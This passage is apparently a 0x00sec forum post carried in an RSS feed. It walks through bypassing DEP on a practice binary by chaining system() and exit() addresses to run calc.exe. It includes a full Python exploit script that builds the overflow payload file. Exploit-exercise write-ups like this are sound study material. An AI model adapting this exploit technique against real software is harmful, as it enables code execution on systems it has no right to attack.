+<img src="//0x00sec.s3.amazonaws.com/original/2X/1/10202ccbd2956a2842c363acefbe38e16a2e2a6f.png" alt="idaex_opt" data-base62-sha1="2iEzATDjtdUSlJk5U8qQJAg9Cmb" width="690" height="195"><br>
+<img src="//0x00sec.s3.amazonaws.com/original/2X/9/97e7b9ddf00f11d1b8330b677c915395f5bc0a37.png" alt="pe_opt(1)" data-base62-sha1="lFOzgrHDAlgKDEigkfKrQNtat7N" width="690" height="277"></p>
+<p>Well, we already have EIP under control but now it doesn’t allow me to execute my shellcode, this is due to <strong>DEP</strong> (data execution prevention).</p>
+<p><em>Summarizing up, DEP changes the permissions of the segments where data is stored to prevent us from executing code there   -ricnar</em></p>
+<p>So to bypass the DEP we can do <strong>ROP</strong> (return oriented programming) which is basically using gadgets that are program’s executable code to change the stack permissions with some api like <strong>VirtualProtect</strong> or <strong>VirtualAlloc</strong></p>
+<p>Looking for gadgets in <strong>pepe.dll</strong> I couldn’t find VirtualAlloc, but there is a pointer to <strong>system()</strong> , would only be missing a return that can be <strong>exit()</strong> and a fixed place that we can control to pass it a string to system()</p>
+<p><img src="//0x00sec.s3.amazonaws.com/original/2X/3/339c2d545022c054d21037730383cf022128555f.png" alt="system_opt(1)" data-base62-sha1="7myXrH1XyIzaq5QNka1KxltAOGr" width="500" height="270"><br>
+<img src="//0x00sec.s3.amazonaws.com/original/2X/9/9c05b9a72fb45ec9c15ec8d99c214b590a885b0d.png" alt="exit_opt" data-base62-sha1="mgeKB6YwmVjl4LSbUDMajQ2sZ2t" width="500" height="55"></p>
+<p>Now only the string for system() would be missing, we can use the address with write permission</p>
+<p><img src="//0x00sec.s3.amazonaws.com/original/2X/2/2e8fd263e848b53b8b135f485a278d96cf99505e.png" alt="calc_opt(1)" data-base62-sha1="6DU6eldeB03SW5pXOdV3AcJZzVs" width="600" height="82"></p>
+<p>Here I set up the stack because <strong>malloc</strong> only assigned 50 bytes and then had no control over the eip and that’s how the exploit would look.</p>
+<p><img src="//0x00sec.s3.amazonaws.com/original/2X/c/c23b185d41f0f55226914125c67ca1f40ec3cd20.png" alt="good_opt" data-base62-sha1="rIfeSUukjw2ha9F8FMq4fXLB280" width="690" height="310"></p>
+<pre><code class="lang-python">import subprocess
+
+system = "\x24\x98\x01\x78"    # system()
+calc = "calc.exe"
+
+buff = "\x41" * 42
+#ebp_20 = "\x41" * 4
+ebp_1c = "\x30\x30\x10\x10"    # Address with write permission
+ebp_18 = "\x41" * 4
+ebp_14 = "\x41" * 4
+ebp_10 = "\x41" * 4
+ebp_c = "\x41" * 4
+ebp_8 = "\x41" * 4
+ebp_4 = "\x41" * 4
+s = "\x41" * 4    # ebp
+r = system
+exit = "\x78\x1d\x10\x10"    # exit()
+ptr_calc = "\x5a\x30\x10\x10"
+
+
+
+data = "\x21\x1210" + "\x12\x12$(" + "\xff" + buff + calc + "\x41" * 6 +  ebp_1c + ebp_18 + ebp_14 + ebp_10 + ebp_c + ebp_8 + ebp_4 + s + r + exit + ptr_calc
+
+with open("fichero.dat", "w") as file:
+	file.write(data)
+
+subprocess.call(r"stack9b.exe")
+</code></pre>
+<p><img src="//0x00sec.s3.amazonaws.com/original/2X/1/17b7def17c2540e0b5e53c5b811e956a4201298a.png" alt="WO_opt" data-base62-sha1="3nOVflwi6BkMO1glJmUirb7Hw2m" width="690" height="330"></p>
+          <p><a href="https://0x00sec.org/t/bypass-data-execution-protection-dep/6988/1">Read full topic</a></p>
+        ]]></description>
+        <link>https://0x00sec.org/t/bypass-data-execution-protection-dep/6988/1</link>
+        <pubDate>Tue, 05 Jun 2018 11:19:57 +0000</pubDate>
+        <guid isPermaLink="false">0x00sec.org-post-6988-1</guid>
+        <source url="https://0x00sec.org/t/bypass-data-execution-protection-dep/6988.rss">Bypass Data Execution Protection (DEP)</source>
+      </item>
+  </channel>
+</rss>
